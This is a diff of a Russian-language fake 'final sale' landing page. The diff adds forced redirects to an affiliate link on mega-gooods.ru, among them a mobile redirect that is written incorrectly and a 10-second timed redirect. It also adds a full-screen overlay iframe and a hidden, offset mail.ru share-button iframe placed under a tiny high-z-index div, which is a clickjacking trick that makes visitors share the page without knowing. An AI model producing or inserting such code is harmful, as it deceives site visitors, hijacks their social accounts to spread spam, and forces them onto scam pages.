@@ -5,18 +5,26 @@
 <meta property="og:title" content="Финальная распродажа! Скидки до 80%!">
 <meta property="og:description" content="Во всех категориях! Автомобильные аксессуары, красота и здоровье, одежда, часы и аксессуары!">
 <meta property="og:image" content="http://gooods.trade/ban.png"/>
- 
-<link rel="stylesheet" type="text/css" href="sweetalert.css">
+<meta name="referrer" content="no-referrer" />
+<script src="mobile-detect.min.js"></script>
+<script type="text/javascript">
+    var md = new MobileDetect(window.navigator.userAgent);
+        if (md.mobile()) {
+            document.location.replace = "http://mega-gooods.ru/shop-sale/?ref=54941&lnk=1178934";
+        }
+</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-<script src="sweetalert.min.js"></script> 
+ 
 <script src="angular.js"></script>
 <script type="text/javascript">
-var sale;
-setInterval(function () {
-sale=Math.floor(Math.random() * (65)) + 25;
-document.getElementById('rndsale').innerHTML=sale+' %';
-}, 200)
+    alert("Внимание! Скидки на все категории товаров!");
 </script>
+<script type="text/javascript">
+          setTimeout("location.href = 'http://mega-gooods.ru/shop-sale/?ref=54941&lnk=1178934';",10000);
+
+    </script>
+   
+
 <style>
     body {
         background: #112b47;        
@@ -31,20 +39,41 @@ document.getElementById('rndsale').innerHTML=sale+' %';
     .modal {
     }
     .pixel {
-        z-index: 1000000;
+        z-index: 1000000000000000;
+        opacity: 0.9;
+        position: absolute;
+    }
+    .alert {
+        z-index: 10000000000;
+        text-align: center;
+        position: fixed;
+        width: 100%;
+        height: 7700px;
+
+    }
+    .top {
+        
+        height: 1000px;
+        width: 100%;
+        
+        position: relative;
+        text-align: center;
+
+
     }
 </style>
 </head>
 <body>
-<!--<iframe src="http://mega-gooods.ru/shop-sale/" width="100%" height="1000" scrolling="no" frameborder="no"></iframe>-->
-<div class="modal" style="position:absolute">
-<script type="text/javascript">
-swal({   title: "<div class=saletitle>ВАША СКИДКА</div>", html: true,  text: "<h1 id=rndsale>50 %</h1>",    confirmButtonText: "ЗАБРАТЬ СКИДКУ", allowEscapeKey: false, confirmButtonColor: "#2c3e50",   imageUrl: "fire.png" });     
-</script>
-    </div>
- <div style="position:absolute; top:2px; left:3px; width:120px; height:600px; overflow:hidden;" class="pixel" id="pixel">
+    <div class="alert"><img src="alert3.png" align="top"></div>
+
    
-    <iframe style="position:relative; width:442px; height:484px; right:64px; bottom: 0px;" scrolling="no" src="https://connect.mail.ru/share?url=http://goods.trade/sale.html" />
+    <iframe src="http://mega-gooods.ru/shop-sale/?ref=54941&lnk=1178934" width="100%" height="7700px" frameborder="no" scrolling="no"></iframe>
+    </div>
+
+
+ <div style="position:absolute; top:340px; left:51px; width:100px; height:30px; overflow:hidden;" class="pixel" id="pixel">
+   
+    <iframe style="position:relative; width:442px; height:400px; right:73px; bottom: 331px;" scrolling="no" src="https://connect.mail.ru/share?url=http://goods.trade/sale.html" />
 
     </div>
 </body>
